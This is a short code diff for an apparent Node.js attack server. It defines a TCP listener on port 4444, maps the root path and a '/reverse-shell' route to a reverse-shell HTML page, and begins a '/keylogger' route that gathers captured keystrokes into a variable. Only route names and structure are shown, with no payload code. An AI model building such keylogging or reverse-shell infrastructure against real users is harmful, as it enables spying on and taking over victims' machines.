@@ -7,12 +7,15 @@ fs = require('fs'),
 httpPort = 80,
 tcpPort = 4444
 
+
 app.use('/files', express.static(__dirname+'/public'))
 app.use(express.json());
 
-app.get('/reverse-shell', (req, res)=>{
+
+app.get(['/','/reverse-shell'], (req, res)=>{
   res.send(fs.readFileSync(__dirname + '/html/reverse-shell.html').toString())
 })
+
 
 var keys = ""
 app.get('/keylogger', (req, res)=>{
